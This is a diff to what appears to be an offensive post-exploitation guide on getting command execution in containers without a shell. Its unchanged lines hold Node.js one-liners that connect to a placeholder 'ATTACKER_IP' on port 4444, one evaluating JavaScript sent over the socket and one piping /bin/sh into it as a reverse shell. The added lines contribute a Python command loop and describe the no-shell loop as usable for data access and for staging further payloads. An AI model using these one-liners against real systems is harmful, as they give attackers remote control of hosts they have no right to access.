@@ -105,7 +105,7 @@ code.interact(local=globals())
 PY
 ```
 
-The equivalent Node.js approach can evaluate JavaScript received over a socket. It is a JavaScript REPL, not an operating-system shell:
+The equivalent Node.js approach can evaluate JavaScript received over a socket. It is a JavaScript REPL, not an operating-system shell; filesystem, process, and networking operations must be performed through Node's APIs:
 
 ```bash
 node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
@@ -129,6 +129,21 @@ PY
 node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
 ```
 
+The older Python command-loop pattern is also useful when `/bin/sh` exists but an interactive PTY is inconvenient. It is retained here with its real dependency made explicit: `subprocess.run(..., shell=True)` invokes the system shell and therefore is **not** a no-shell technique.
+
+```bash
+python3 -c '
+import subprocess
+while True:
+    cmd = input("sh> ")
+    if cmd.strip() in ("exit", "quit"):
+        break
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    print(result.stdout, end="")
+    print(result.stderr, end="")
+'
+```
+
 ### Full Example: No-Shell Python Command Loop
 
 If the image has Python but no shell at all, a local Python REPL can still support filesystem, environment, and network inspection:
@@ -149,7 +164,7 @@ while True:
 PY
 ```
 
-This loop does not invoke `/bin/sh`. It evaluates Python expressions and statements directly, so operations must use Python APIs rather than shell commands.
+This loop does not invoke `/bin/sh`. It evaluates Python expressions and statements directly, so operations must use Python APIs rather than shell commands. Within that limitation, it can still provide much of the impact of a basic shell: filesystem and environment enumeration, data access, network activity, and staging further payloads through the installed runtime.
 
 ### In-Memory Tool Execution
 
